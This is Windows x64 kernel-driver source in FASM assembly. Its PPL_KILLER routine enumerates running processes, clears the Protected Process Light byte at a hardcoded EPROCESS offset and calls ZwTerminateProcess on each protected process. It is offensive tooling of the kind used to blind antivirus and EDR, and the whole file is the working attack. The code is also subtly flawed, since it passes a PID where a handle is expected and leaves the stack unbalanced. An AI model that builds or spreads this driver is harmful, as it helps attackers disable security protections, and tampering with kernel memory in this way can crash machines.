format PE64 native
entry DriverEntry
include 'win64a.inc'
include 'data.inc'

struct UNICODE_STRING
  Length dw ?
  MaximumLength dw ?
  Buffer dq ?
ends

CODE
proc DriverEntry DriverObject, RegistryPath 
	MOV 	RAX,[DriverObject]
	LEA 	R8,[OnUnload]
	MOV 	[RAX+68H],R8          
	
	SUB 	RSP, 28H
	CALL    RESOLVE_ALL
	CALL    PPL_KILLER
	
	XOR 	EAX,EAX 
	RET
endp

proc RESOLVE_ALL
	SUB 	RSP, 28H
	
	LEA 	RCX, [u_PsLookupProcessByProcessId]
	CALL 	[MmGetSystemRoutineAddress]
	MOV 	[a_PsLookupProcessByProcessId], RAX
	
	LEA 	RCX, [u_ObfDereferenceObject]
	CALL 	[MmGetSystemRoutineAddress]
	MOV 	[a_ObfDereferenceObject], RAX
	
	LEA 	RCX, [u_ZwQuerySystemInformation]
	CALL 	[MmGetSystemRoutineAddress]
	MOV 	[a_ZwQuerySystemInformation], RAX
	
	LEA 	RCX, [u_ExAllocatePoolZero]
	CALL 	[MmGetSystemRoutineAddress]
	MOV 	[a_ExAllocatePoolZero], RAX
	
	LEA 	RCX, [u_ExFreePoolWithTag]
	CALL 	[MmGetSystemRoutineAddress]
	MOV 	[a_ExFreePoolWithTag], RAX
	
	LEA 	RCX, [u_ZwTerminateProcess]
	CALL 	[MmGetSystemRoutineAddress]
	MOV 	[a_ZwTerminateProcess], RAX

	ADD 	RSP, 28H
	RET
endp

proc PPL_KILLER
	LEA 	RCX, [SystemProcessInformation]
	XOR 	RDX, RDX 
	XOR 	R8, R8 
	LEA 	R9, [infoSize]
	MOV 	RAX, [a_ZwQuerySystemInformation]
	TEST 	RAX, RAX
	JZ 	@F
	CALL 	RAX
	CMP 	EAX, 0C0000004h
	JNE @F 
	
	MOV     RDX, [infoSize]   
	SHL     RDX, 1             
	XOR     RCX, RCX           
	MOV     R8, 'PPLL'       
	MOV 	RAX, [a_ExAllocatePoolZero]
	CALL    RAX
	TEST 	RAX, RAX 
	JZ @F 
	MOV 	[pInfoBuffer], RAX 
	
	LEA 	RCX, [SystemProcessInformation]
	MOV 	RDX, RAX 
	MOV 	R8, [infoSize] 
	SHL 	R8, 1
	XOR 	R9, R9 
	MOV 	RAX, [a_ZwQuerySystemInformation]
	CALL 	RAX 
	TEST 	EAX, EAX 
	JS FREE_EX
	
	MOV 	RAX, [pInfoBuffer]
	MOV 	[pCurrentEntry], RAX 
.LOOP:
	MOV 	RAX, [pCurrentEntry]
	MOV     RCX, [RAX + 80h] 
	MOV     [savedPid], RCX
	LEA 	RDX, [Process]
	MOV 	RAX, [a_PsLookupProcessByProcessId]
	CALL 	RAX
	TEST 	EAX, EAX 
	JS .NEXT 
	
	MOV 	RAX, [Process] 
	MOV 	ECX, [PsProtectionOffset]
	MOVZX 	EAX, byte [RAX + RCX]
	AND 	EAX, 07h
	CMP 	EAX, 00h
	JE .DEREF

	MOV 	RAX, [Process]
	MOV 	ECX, [PsProtectionOffset]
	MOV 	byte [RAX + RCX], 0 

	MOV 	RCX, [savedPid]
	XOR 	RDX, RDX 
	MOV 	RAX, [a_ZwTerminateProcess]
	CALL 	RAX
.DEREF:
	MOV 	RCX, [Process]
	MOV 	RAX, [a_ObfDereferenceObject]
	CALL 	RAX
	
.NEXT:
	MOV     RAX, [pCurrentEntry]
    MOV     ECX, [RAX]             
    TEST    ECX, ECX
    JZ      FREE_EX
    ADD     RAX, RCX
    MOV     [pCurrentEntry], RAX
    JMP     .LOOP
	
FREE_EX:
	MOV 	RCX, [pInfoBuffer]
	XOR 	RDX, RDX 
	MOV 	RAX, [a_ExFreePoolWithTag]
	CALL 	RAX
	RET
@@:
	RET 
endp 

proc OnUnload DriverObject 
	RET
endp

DATA 
align 16 
SystemProcessInformation dd 5
ProtectedLight db 1 

align 8
savedPid dq  0
Process dq  0
pInfoBuffer dq 0
infoSize dq 0
pCurrentEntry dq 0
NumUnprotected dq 0 
PsProtectionOffset dd 087Ah

a_PsLookupProcessByProcessId dq 0
a_ObfDereferenceObject dq 0
a_ZwQuerySystemInformation dq 0
a_ExAllocatePoolZero dq 0
a_ExFreePoolWithTag dq 0
a_ZwTerminateProcess dq 0

s_PsLookupProcessByProcessId du 'PsLookupProcessByProcessId',0
u_PsLookupProcessByProcessId UNICODE_STRING 52, 54, s_PsLookupProcessByProcessId

s_ObfDereferenceObject du 'ObfDereferenceObject',0
u_ObfDereferenceObject UNICODE_STRING 40, 42, s_ObfDereferenceObject

s_ZwQuerySystemInformation du 'ZwQuerySystemInformation',0
u_ZwQuerySystemInformation UNICODE_STRING 48, 50, s_ZwQuerySystemInformation

s_ExAllocatePoolZero du 'ExAllocatePoolZero',0
u_ExAllocatePoolZero UNICODE_STRING 36, 38, s_ExAllocatePoolZero

s_ExFreePoolWithTag du 'ExFreePoolWithTag',0
u_ExFreePoolWithTag UNICODE_STRING 34, 36, s_ExFreePoolWithTag

s_ZwTerminateProcess du 'ZwTerminateProcess',0
u_ZwTerminateProcess UNICODE_STRING 36, 38, s_ZwTerminateProcess

IMPORTS
library ntoskrnl, 'ntoskrnl.exe'
import ntoskrnl,\
	MmGetSystemRoutineAddress, 'MmGetSystemRoutineAddress'
